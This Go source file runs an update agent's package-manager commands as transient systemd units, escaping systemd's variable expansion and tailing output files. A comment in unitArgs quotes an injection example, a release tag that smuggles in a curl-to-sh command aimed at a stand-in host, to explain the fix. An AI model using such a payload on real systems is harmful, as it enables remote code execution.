package agent

// The agent's service is locked down (a read-only system, no new privileges, 128 MB), so apt, snap
// and the like cannot work inside it. Each update or check command runs instead as a transient
// systemd unit of its own, outside the agent's sandbox and process tree, as the dashboard's app
// store does. Its output goes to files in the agent's state folder, which the agent tails: the
// dashboard sees an update's progress, and a restart of the agent does not cut an apt run short.

import (
	"bytes"
	"cmp"
	"context"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"nightjar/internal/updates"
)

// UnitRunner runs the update manager's commands (see updates.Runner). The zero value works on a
// real machine.
type UnitRunner struct {
	// Dir holds each command's output while it runs; StateDir/updates by default.
	Dir string
	// SystemdRun and Systemctl are the programs to use; empty finds them on the PATH. Tests point
	// them at fakes.
	SystemdRun, Systemctl string
	// Direct runs a command in the agent itself: the few that only read, and every one when there
	// is no systemd-run to use. updates.Exec by default.
	Direct updates.Runner
	// SettlePoll is how often Settle looks again; 5 seconds by default.
	SettlePoll time.Duration

	setup sync.Once
	// noUnits says why commands run in the agent itself, "" when they run as units.
	noUnits string
	// version is systemd's.
	version int
	n       atomic.Int64
}

// minSystemd is the first systemd whose units can append their output to a file (append:).
const minSystemd = 240

var systemdVersionRE = regexp.MustCompile(`^systemd (\d+)`)

func (u *UnitRunner) init() {
	u.setup.Do(func() {
		u.Dir = cmp.Or(u.Dir, filepath.Join(StateDir, "updates"))
		if u.Direct == nil {
			u.Direct = updates.Exec
		}
		if u.Systemctl == "" {
			u.Systemctl = "systemctl"
		}
		if u.SystemdRun == "" {
			p, err := exec.LookPath("systemd-run")
			if err != nil {
				u.noUnits = "systemd-run is missing"
				return
			}
			u.SystemdRun = p
		}
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		out, err := exec.CommandContext(ctx, u.SystemdRun, "--version").Output()
		if err != nil {
			u.noUnits = "systemd-run is missing (" + err.Error() + ")"
			return
		}
		version := 0
		if m := systemdVersionRE.FindSubmatch(out); m != nil {
			version, _ = strconv.Atoi(string(m[1]))
		}
		u.version = version
		if version < minSystemd {
			u.noUnits = fmt.Sprintf("this systemd is older than %d, whose units can write to a file", minSystemd)
			return
		}
		// Output files whose names systemd could misread are not risked; the folder is the agent's own.
		if strings.ContainsAny(u.Dir, " \t\n\\'\":") {
			u.noUnits = "the agent's state folder has an unusual name"
		}
	})
}

// Run runs c as a transient unit, or in the agent itself when it only reads or there is no
// systemd-run to use.
func (u *UnitRunner) Run(ctx context.Context, c updates.Command) (updates.Output, error) {
	u.init()
	if readOnly(c.Argv) {
		return u.Direct(ctx, c)
	}
	if u.noUnits != "" {
		return u.direct(ctx, c)
	}
	return u.unit(ctx, c)
}

// direct runs a command in the agent's sandbox, where installing usually fails, and says so: in
// the live output, and with a failure's reason.
func (u *UnitRunner) direct(ctx context.Context, c updates.Command) (updates.Output, error) {
	note := "Running inside the agent's sandbox, where package managers may fail: " + u.noUnits
	if c.Output != nil {
		fmt.Fprintln(c.Output, note)
	}
	out, err := u.Direct(ctx, c)
	if err == nil && out.Code != 0 {
		out.Stderr = strings.TrimRight(out.Stderr, "\n") + "\n(" + note + ")"
	}
	return out, err
}

// readOnly are commands that only look, which work inside the sandbox: a unit for each would be
// waste (an update checks its service is up every few seconds).
func readOnly(argv []string) bool {
	if len(argv) == 0 {
		return false
	}
	switch argv[0] {
	case "dpkg-query", "apt-cache":
		return true
	case "dpkg":
		return len(argv) > 1 && argv[1] == "--compare-versions"
	case "systemctl":
		return len(argv) > 1 && (argv[1] == "is-active" || argv[1] == "show" || argv[1] == "list-units")
	case "kill":
		// Whether a process is still there, asked every few seconds while apt's lock is held.
		return len(argv) > 1 && argv[1] == "-0"
	}
	return false
}

var unitWordRE = regexp.MustCompile(`[^a-z0-9]+`)

// unitName is a name no other unit has: the program it runs, when, and a count.
func (u *UnitRunner) unitName(argv []string) string {
	prog := "command"
	if len(argv) > 0 {
		if p := strings.Trim(unitWordRE.ReplaceAllString(strings.ToLower(filepath.Base(argv[0])), "-"), "-"); p != "" {
			prog = p[:min(len(p), 20)]
		}
	}
	return fmt.Sprintf("nightjar-update-%s-%d-%d.service", prog, time.Now().Unix(), u.n.Add(1))
}

// defaultPath is the PATH a unit runs with; systemd's own leaves out /usr/local.
const defaultPath = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

// expandOff is the first systemd-run that can leave ${VAR} in a command alone.
const expandOff = 254

// unitArgs is the systemd-run command line that runs c as unit, writing to the two files, for
// systemd version. systemd reads ${VAR} and $VAR in a unit's command line as its own variables, and
// fills them in before sh ever sees them: an update command's "${TAG}" would get a release's tag
// pasted into the script itself, where a tag such as v1$(curl${IFS}evil|sh) runs. Newer systemd is
// told not to; on older, each $ is doubled, which systemd reads as a plain $.
func unitArgs(unit string, c updates.Command, stdout, stderr string, version int) []string {
	args := []string{"--unit=" + unit, "--description=Nightjar agent update step", "--quiet", "--collect", "--wait",
		"--property=StandardOutput=append:" + stdout, "--property=StandardError=append:" + stderr,
		"--setenv=PATH=" + defaultPath}
	argv := c.Argv
	if version >= expandOff {
		args = append(args, "--expand-environment=no")
	} else {
		argv = make([]string, len(c.Argv))
		for i, a := range c.Argv {
			argv[i] = strings.ReplaceAll(a, "$", "$$")
		}
	}
	if c.Dir != "" {
		args = append(args, "--working-directory="+c.Dir)
	}
	if c.User != "" {
		args = append(args, "--uid="+c.User)
		if acct, err := user.Lookup(c.User); err == nil {
			args = append(args, "--setenv=HOME="+acct.HomeDir, "--setenv=USER="+c.User)
		}
	}
	for _, kv := range c.Env {
		args = append(args, "--setenv="+kv)
	}
	return append(append(args, "--"), argv...)
}

// unit runs c as a transient unit. Its output goes to two files (stdout and stderr, which the
// update manager reads apart), tailed while it runs. Out of time, the unit is stopped, with
// everything it started, not only the systemd-run that waits for it.
func (u *UnitRunner) unit(ctx context.Context, c updates.Command) (updates.Output, error) {
	if c.Timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, c.Timeout)
		defer cancel()
	}
	if err := os.MkdirAll(u.Dir, 0o700); err != nil {
		return updates.Output{}, err
	}
	files := make([]*os.File, 2)
	for i, suffix := range []string{".out", ".err"} {
		f, err := os.CreateTemp(u.Dir, "run-*"+suffix)
		if err != nil {
			return updates.Output{}, err
		}
		defer os.Remove(f.Name())
		defer f.Close()
		files[i] = f
	}
	name := u.unitName(c.Argv)
	cmd := exec.CommandContext(ctx, u.SystemdRun, unitArgs(name, c, files[0].Name(), files[1].Name(), u.version)...)
	cmd.Cancel = func() error {
		stopCtx, cancel := context.WithTimeout(context.Background(), time.Minute)
		defer cancel()
		if out, err := exec.CommandContext(stopCtx, u.Systemctl, "stop", name).CombinedOutput(); err != nil {
			slog.Warn("Could not stop the timed-out update step", "unit", name, "err", strings.TrimSpace(string(out)))
		}
		return cmd.Process.Kill()
	}
	var own bytes.Buffer // what systemd-run itself says, such as why it could not start the unit
	cmd.Stdout, cmd.Stderr = &own, &own
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	cmd.WaitDelay = 10 * time.Second
	if err := cmd.Start(); err != nil {
		return updates.Output{}, err
	}
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()
	var stdout, stderr updates.OutputBuffer
	tails := []*fileTail{{f: files[0], to: &stdout, live: c.Output}, {f: files[1], to: &stderr, live: c.Output}}
	var err error
	for waiting := true; waiting; {
		select {
		case err = <-done:
			waiting = false
		case <-time.After(200 * time.Millisecond):
		}
		for _, t := range tails {
			t.read()
		}
	}
	out := updates.Output{Stdout: stdout.String(), Stderr: stderr.String()}
	if ctx.Err() != nil {
		return out, ctx.Err()
	}
	var exitErr *exec.ExitError
	switch {
	case errors.As(err, &exitErr):
		// systemd-run --wait exits with the command's code; when it could not start the unit at all,
		// it says why itself.
		out.Code = exitErr.ExitCode()
		if s := strings.TrimSpace(own.String()); s != "" {
			out.Stderr = strings.TrimRight(out.Stderr, "\n") + "\n" + s
		}
		return out, nil
	case errors.Is(err, exec.ErrWaitDelay):
		return out, nil
	}
	return out, err
}

// fileTail passes on what is written to a file as it grows.
type fileTail struct {
	f    *os.File
	to   io.Writer
	live io.Writer
}

func (t *fileTail) read() {
	chunk := make([]byte, 64<<10)
	for {
		n, err := t.f.Read(chunk)
		if n > 0 {
			t.to.Write(chunk[:n])
			if t.live != nil {
				t.live.Write(chunk[:n])
			}
		}
		if n == 0 || err != nil {
			return
		}
	}
}

// Settle waits, until ctx ends, for update steps the agent left running when it last stopped:
// units outlive the agent, so an apt run cut off from its agent goes on installing. The update
// manager starts nothing until they are done, then counts the update they belonged to as one whose
// end it did not see. Their output files are cleared away after.
func (u *UnitRunner) Settle(ctx context.Context) {
	u.init()
	if u.noUnits != "" {
		return
	}
	for said := false; ; said = true {
		left := u.leftovers(ctx)
		if len(left) == 0 {
			break
		}
		if !said {
			slog.Info("waiting for update steps left running before the agent restarted", "units", left)
		}
		select {
		case <-ctx.Done():
			slog.Warn("update steps from before the agent restarted are still running", "units", left)
			return
		case <-time.After(cmp.Or(u.SettlePoll, 5*time.Second)):
		}
	}
	old, _ := filepath.Glob(filepath.Join(u.Dir, "run-*"))
	for _, f := range old {
		os.Remove(f)
	}
}

// leftovers are the agent's update units still running.
func (u *UnitRunner) leftovers(ctx context.Context) []string {
	ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, u.Systemctl, "list-units", "--plain", "--no-legend", "--no-pager",
		"--state=activating,active,deactivating,reloading", "nightjar-update-*").Output()
	if err != nil {
		return nil
	}
	var units []string
	for _, line := range strings.Split(string(out), "\n") {
		if f := strings.Fields(line); len(f) > 0 && strings.HasPrefix(f[0], "nightjar-update-") {
			units = append(units, f[0])
		}
	}
	return units
}
